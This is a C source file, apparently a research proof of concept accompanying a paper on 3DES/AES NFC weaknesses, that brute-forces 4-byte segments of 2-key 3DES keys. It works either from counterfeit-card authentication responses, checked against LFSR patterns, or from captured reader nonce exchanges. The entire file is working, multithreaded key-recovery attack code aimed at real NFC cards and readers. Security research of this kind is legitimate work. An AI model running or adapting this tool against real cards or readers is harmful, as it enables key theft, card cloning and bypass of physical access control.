// noproto & doegox, 2025
// cf "BREAKMEIFYOUCAN!: Exploiting Keyspace Reduction and Relay Attacks in 3DES and AES-protected NFC Technologies"
// for more info

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <pthread.h>
#include <openssl/des.h>
#include <errno.h>
#include <ctype.h>

#ifdef _MSC_VER
# define bswap64 _byteswap_uint64
#else
# define bswap64 __builtin_bswap64
#endif

#define BLOCK_SIZE 8   // DES (and 3DES) block size in bytes
#define KEY_SIZE   16  // Full 2TDEA key size (K1 || K2)
#define BENCHMARK_FULL_KEYSPACE 0

#ifdef _MSC_VER
#include <windows.h>
typedef volatile LONG search_flag_t;
static int load_flag(search_flag_t *flag) { return InterlockedCompareExchange(flag, 0, 0); }
static void store_flag(search_flag_t *flag, int value) { InterlockedExchange(flag, value); }
#else
typedef int search_flag_t;
static int load_flag(search_flag_t *flag) { return __atomic_load_n(flag, __ATOMIC_RELAXED); }
static void store_flag(search_flag_t *flag, int value) { __atomic_store_n(flag, value, __ATOMIC_RELAXED); }
#endif

static search_flag_t key_found = 0;
static search_flag_t abort_search = 0;

static int hex_digit(char value) {
    if (value >= '0' && value <= '9') return value - '0';
    if (value >= 'a' && value <= 'f') return value - 'a' + 10;
    if (value >= 'A' && value <= 'F') return value - 'A' + 10;
    return -1;
}

static bool positive_number(const char *text, unsigned limit, int *value) {
    if (!isdigit((unsigned char)*text)) return false;
    errno = 0;
    char *end;
    unsigned long number = strtoul(text, &end, 10);
    if (errno != 0 || *end != '\0' || number == 0 || number > limit) return false;
    *value = (int)number;
    return true;
}

typedef enum {
    LFSR_UNDEF = 0,
    LFSR_ULCG = 1,
    LFSR_USCUIDUL = 2
} lfsr_t;

typedef struct {
    uint32_t start;               // starting candidate (inclusive)
    uint32_t end;                 // ending candidate (exclusive)
    int key_mode;                 // 0 to 3 (i.e. brute force segment 1-4 as 0-indexed)
    unsigned char init_ciphertext[BLOCK_SIZE];
    unsigned char prev_ciphertext[BLOCK_SIZE];  // "IV" of ciphertext for CBC mode in reader mode
    unsigned char ciphertext[BLOCK_SIZE];
    unsigned char base_key[KEY_SIZE];  // the 3DES base key provided by the user
    int thread_id;
    lfsr_t lfsr_type;
    bool is_reader_mode;          // true for -r mode, false for -c mode
} thread_args_t;

// Converts a hex string to bytes. The hex string must be exactly 2*len hex digits long.
static int hex_to_bytes(const char *hex, unsigned char *buf, size_t len) {
    if (strlen(hex) != len * 2)
        return 0;
    for (size_t i = 0; i < len; i++) {
        int high = hex_digit(hex[2 * i]), low = hex_digit(hex[2 * i + 1]);
        if (high < 0 || low < 0) return 0;
        buf[i] = (unsigned char)((high << 4) | low);
    }
    return 1;
}

// Print a byte array as hex.
static void print_hex(const unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        printf("%02X", buf[i]);
    printf("\n");
}

static bool valid_lfsr_ulcg(uint64_t x64) {
    x64 = bswap64(x64);
    uint16_t x16 = x64 >> 48;
    x16 = x16 << 15 | ((x16 >> 1) ^ ((x16 >> 3 ^ x16 >> 4 ^ x16 >> 6) & 1));
    if (x16 != ((x64 >> 32) & 0xFFFF)) return false;
    x16 = x16 << 15 | ((x16 >> 1) ^ ((x16 >> 3 ^ x16 >> 4 ^ x16 >> 6) & 1));
    if (x16 != ((x64 >> 16) & 0xFFFF)) return false;
    x16 = x16 << 15 | ((x16 >> 1) ^ ((x16 >> 3 ^ x16 >> 4 ^ x16 >> 6) & 1));
    if (x16 != (x64 & 0xFFFF)) return false;
    return true;
}

static bool valid_lfsr_uscuidul(uint64_t x64) {
    x64 = bswap64(x64);
    uint16_t x16 = x64 & 0xFFFF;
    for (int i = 0; i < 16; i++) x16 = x16 >> 1 | (x16 ^ x16 >> 2 ^ x16 >> 3 ^ x16 >> 5) << 15;
    if (x16 != ((x64 >> 16) & 0xFFFF)) return false;
    for (int i = 0; i < 16; i++) x16 = x16 >> 1 | (x16 ^ x16 >> 2 ^ x16 >> 3 ^ x16 >> 5) << 15;
    if (x16 != ((x64 >> 32) & 0xFFFF)) return false;
    for (int i = 0; i < 16; i++) x16 = x16 >> 1 | (x16 ^ x16 >> 2 ^ x16 >> 3 ^ x16 >> 5) << 15;
    if (x16 != ((x64 >> 48) & 0xFFFF)) return false;
    return true;
}


static bool valid_lfsr(uint64_t x64, lfsr_t lfsr_type) {
    switch (lfsr_type) {
        case LFSR_ULCG:
            return valid_lfsr_ulcg(x64);
        case LFSR_USCUIDUL:
            return valid_lfsr_uscuidul(x64);
        case LFSR_UNDEF:
        default:
            return false;
    }
}

static lfsr_t detect_lfsr_type(unsigned char *init_ciphertext) {
    DES_cblock fixed_key = {0};
    DES_key_schedule fixed_schedule;
    DES_set_key_unchecked(&fixed_key, &fixed_schedule);
    uint64_t out;
    DES_ecb_encrypt((DES_cblock *)init_ciphertext, (DES_cblock *)&out, &fixed_schedule, DES_DECRYPT);
    if (valid_lfsr_ulcg(out)) {
        return LFSR_ULCG;
    } else if (valid_lfsr_uscuidul(out)) {
        return LFSR_USCUIDUL;
    }
    return LFSR_UNDEF;
}

// Worker thread function using low-level DES functions.
static void *worker(void *arg) {
    thread_args_t *targs = (thread_args_t *) arg;
    uint32_t start = targs->start;
    uint32_t end   = targs->end;
    int key_mode   = targs->key_mode;

    // Determine which half is being brute forced.
    // For key_mode 0 or 1 the candidate is in K1; for key_mode 2 or 3 the candidate is in K2.
    int candidate_in_K1 = (key_mode < 2) ? 1 : 0;

    // Determine the 4-byte offset within the variable half:
    // For K1, key_mode 0 means segment1 (offset 0), key_mode 1 means segment2 (offset 4).
    // For K2, key_mode 2 means segment3 (offset 0), key_mode 3 means segment4 (offset 4).
    int var_offset = candidate_in_K1 ? ((key_mode % 2) * 4) : (((key_mode - 2) % 2) * 4);

    // Precompute the fixed half's DES key schedule.
    DES_cblock fixed_key;
    if (candidate_in_K1) {
        // Fixed half is K2: bytes 8..15 of base_key.
        memcpy(fixed_key, targs->base_key + 8, 8);
    } else {
        // Candidate in K2; fixed half is K1: bytes 0..7 of base_key.
        memcpy(fixed_key, targs->base_key, 8);
    }
    DES_key_schedule fixed_schedule;
    DES_set_key_unchecked(&fixed_key, &fixed_schedule);
    uint64_t out;
    uint64_t init_out;

    // For the candidate half, start with the corresponding half from the base key.
    unsigned char base_half[8];
    if (candidate_in_K1)
        memcpy(base_half, targs->base_key, 8);
    else
        memcpy(base_half, targs->base_key + 8, 8);

    // Loop over the candidate key indices in this thread's range.
    for (uint32_t idx = start; idx < end; idx++) {
        if (load_flag(&abort_search) || (load_flag(&key_found) && !BENCHMARK_FULL_KEYSPACE))
            break;  // Some other thread already found the key.
        // Convert the candidate index (28 bits) into 4 bytes.
        // Each candidate byte is constructed from a 7-bit chunk shifted left by 1 so that the LSB is zero.
        uint8_t b0 = ((idx) & 0x7F) << 1;
        uint8_t b1 = ((idx >> 7) & 0x7F) << 1;
        uint8_t b2 = ((idx >> 14) & 0x7F) << 1;
        uint8_t b3 = ((idx >> 21) & 0x7F) << 1;
        // Build the candidate half key by starting with the fixed base half and substituting candidate bytes.
        DES_cblock candidate_half;
        memcpy(candidate_half, base_half, 8);
        candidate_half[var_offset    ] = b0;
        candidate_half[var_offset + 1] = b1;
        candidate_half[var_offset + 2] = b2;
        candidate_half[var_offset + 3] = b3;

        // Compute the candidate half's DES key schedule.
        DES_key_schedule candidate_schedule;
        DES_set_key_unchecked(&candidate_half, &candidate_schedule);

        // Perform 2-key triple DES decryption on the ciphertext.
        // If candidate is in K1: decryption = DES_ecb3_encrypt(cipher, out, candidate, fixed, candidate, DES_DECRYPT)
        // If candidate is in K2: decryption = DES_ecb3_encrypt(cipher, out, fixed, candidate, fixed, DES_DECRYPT)
        if (candidate_in_K1) {
            DES_ecb3_encrypt((DES_cblock *)targs->ciphertext, (DES_cblock *)&out,
                             &candidate_schedule, &fixed_schedule, &candidate_schedule, DES_DECRYPT);
        } else {
            DES_ecb3_encrypt((DES_cblock *)targs->ciphertext, (DES_cblock *)&out,
                             &fixed_schedule, &candidate_schedule, &fixed_schedule, DES_DECRYPT);
        }

        bool match = false;
        if (targs->is_reader_mode) {
            // In reader mode, also decrypt init_ciphertext and check for rotation relationship
            // Apply XOR block to the second decrypted block (for CBC mode)
            if (candidate_in_K1) {
                DES_ecb3_encrypt((DES_cblock *)targs->init_ciphertext, (DES_cblock *)&init_out,
                                 &candidate_schedule, &fixed_schedule, &candidate_schedule, DES_DECRYPT);
            } else {
                DES_ecb3_encrypt((DES_cblock *)targs->init_ciphertext, (DES_cblock *)&init_out,
                                 &fixed_schedule, &candidate_schedule, &fixed_schedule, DES_DECRYPT);
            }
            // Apply XOR block to the second decrypted block (for CBC mode)
            uint64_t previous;
            memcpy(&previous, targs->prev_ciphertext, sizeof(previous));
            out ^= previous;

            // Check if out is 8-bit (1-byte) left rotated version of init_out
            // Need to convert to big-endian for byte rotation, then back to little-endian
            uint64_t init_be = bswap64(init_out);
            uint64_t rotated_be = (init_be << 8) | (init_be >> 56);
            uint64_t rotated = bswap64(rotated_be);
            match = (out == rotated);
        } else {
            // In counterfeit mode, check the resulting plaintext against LFSR
            match = valid_lfsr(out, targs->lfsr_type);
        }

        if (match) {
            store_flag(&key_found, 1);  // signal to other threads

            // Build the full 16-byte key: start with the base key and substitute the candidate 4 bytes.
            unsigned char full_key[KEY_SIZE];
            memcpy(full_key, targs->base_key, KEY_SIZE);
            int seg_offset = key_mode * 4;  // key_mode: 0->bytes0, 1->bytes4, 2->bytes8, 3->bytes12.
            full_key[seg_offset]     = b0;
            full_key[seg_offset + 1] = b1;
            full_key[seg_offset + 2] = b2;
            full_key[seg_offset + 3] = b3;
            printf("Thread %d: Found key index: %u\n", targs->thread_id, idx);
            printf("Full key (hex): ");
            print_hex(full_key, KEY_SIZE);
            if (!BENCHMARK_FULL_KEYSPACE)
                break;
        }
    }
    return NULL;
}

static void print_help_and_exit(const char *cmd_name) {
    fprintf(stderr,
            "Usage:\n"
            "   * Counterfeit key recovery:\n"
            "       %s -c <null key ERndB (16 hex digits)> <target key ERndB (16 hex digits)> <3DES base key hex (32 hex digits)> <key segment (1-4)> <num threads (1-256)>\n"
            "   * Reader nonce key recovery:\n"
            "       %s -r <ERndB (16 hex digits)> <ERndARndB' (32 hex digits)> <3DES base key hex (32 hex digits)> <key segment (1-4)> <num threads (1-256)>\n",
            cmd_name,
            cmd_name);
    exit(1);
}

int main(int argc, char **argv) {
    store_flag(&key_found, 0);
    store_flag(&abort_search, 0);
    // Check for -c or -r flag first to determine expected argument count
    if (argc < 2) {
        print_help_and_exit(argv[0]);
    }
    bool is_reader_mode = false;
    if (strcmp(argv[1], "-c") == 0) {
        is_reader_mode = false;
        if (argc != 7) {
            fprintf(stderr, "Error: -c mode requires exactly 6 arguments\n");
            print_help_and_exit(argv[0]);
        }
    } else if (strcmp(argv[1], "-r") == 0) {
        is_reader_mode = true;
        if (argc != 7) {
            fprintf(stderr, "Error: -r mode requires exactly 6 arguments\n");
            print_help_and_exit(argv[0]);
        }
    } else {
        fprintf(stderr, "Error: first argument must be -c or -r\n");
        print_help_and_exit(argv[0]);
    }

    unsigned char init_ciphertext[BLOCK_SIZE];
    unsigned char tmp_blocks[2 * BLOCK_SIZE];
    unsigned char ciphertext[BLOCK_SIZE];
    unsigned char base_key[KEY_SIZE];

    if (is_reader_mode) {
        // In reader mode, the first ciphertext is ERndB and the second is ERndA|ERndB'
        if (!hex_to_bytes(argv[2], init_ciphertext, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid ERndB hex string.\n");
            return 1;
        }
        if (!hex_to_bytes(argv[3], tmp_blocks, 2 * BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid ERndARndB' hex string.\n");
            return 1;
        }
    } else {
        // In counterfeit mode, both ciphertexts are just ciphertext blocks
        if (!hex_to_bytes(argv[2], init_ciphertext, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid null key ERndB hex string.\n");
            return 1;
        }
        if (!hex_to_bytes(argv[3], ciphertext, BLOCK_SIZE)) {
            fprintf(stderr, "Error: invalid target key ERndB hex string.\n");
            return 1;
        }
    }
    if (!hex_to_bytes(argv[4], base_key, KEY_SIZE)) {
        fprintf(stderr, "Error: invalid 3DES base key hex string.\n");
        return 1;
    }

    int seg;
    if (!positive_number(argv[5], 4, &seg)) {
        fprintf(stderr, "Error: key segment must be between 1 and 4.\n");
        return 1;
    }
    int num_threads;
    if (!positive_number(argv[6], 256, &num_threads)) {
        fprintf(stderr, "Error: number of threads must be between 1 and 256.\n");
        return 1;
    }

    lfsr_t lfsr_type = LFSR_UNDEF;
    if (!is_reader_mode) {
        // Only detect LFSR type in counterfeit mode
        lfsr_type = detect_lfsr_type(init_ciphertext);
        switch (lfsr_type) {
            case LFSR_ULCG:
                printf("LFSR detection: ULCG\n");
                break;
            case LFSR_USCUIDUL:
                printf("LFSR detection: ULC_USCUIDUL\n");
                break;
            case LFSR_UNDEF:
            default:
                fprintf(stderr, "LFSR detection: Could not detect LFSR!!\n");
                return 1;
        }
    }

    // key_mode is zero-indexed (0,1,2,3)
    int key_mode = seg - 1;

    // Total candidate space: 2^28 keys.
    uint32_t total = (1UL << 28);
    uint32_t chunk = total / num_threads;
    uint32_t remainder = total % num_threads;

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    thread_args_t *targs = malloc(num_threads * sizeof(thread_args_t));
    if (!threads || !targs) {
        fprintf(stderr, "Allocation error.\n");
        free(threads);
        free(targs);
        return 1;
    }

    // Divide the candidate space as equally as possible among threads.
    uint32_t current = 0;
    int started = 0;
    int status = 0;
    for (int i = 0; i < num_threads; i++) {
        targs[i].start = current;
        targs[i].end   = current + chunk;
        if (i == num_threads - 1)
            targs[i].end += remainder;
        targs[i].key_mode = key_mode;
        targs[i].lfsr_type = lfsr_type;
        targs[i].is_reader_mode = is_reader_mode;
        memcpy(targs[i].init_ciphertext, init_ciphertext, BLOCK_SIZE);
        if (is_reader_mode) {
            memcpy(targs[i].prev_ciphertext, tmp_blocks, BLOCK_SIZE);
            memcpy(targs[i].ciphertext, tmp_blocks + BLOCK_SIZE, BLOCK_SIZE);
        } else {
            memcpy(targs[i].ciphertext, ciphertext, BLOCK_SIZE);
        }
        memcpy(targs[i].base_key, base_key, KEY_SIZE);
        targs[i].thread_id = i;
        current = targs[i].end;
        int error = pthread_create(&threads[i], NULL, worker, &targs[i]);
        if (error != 0) {
            fprintf(stderr, "Cannot start worker %d: %s; search aborted\n", i, strerror(error));
            store_flag(&abort_search, 1);
            status = 1;
            break;
        }
        started++;
    }

    for (int i = 0; i < started; i++)
        pthread_join(threads[i], NULL);

    if (status == 0 && !load_flag(&key_found))
        printf("No matching key was found.\n");

    free(threads);
    free(targs);
    return status;
}
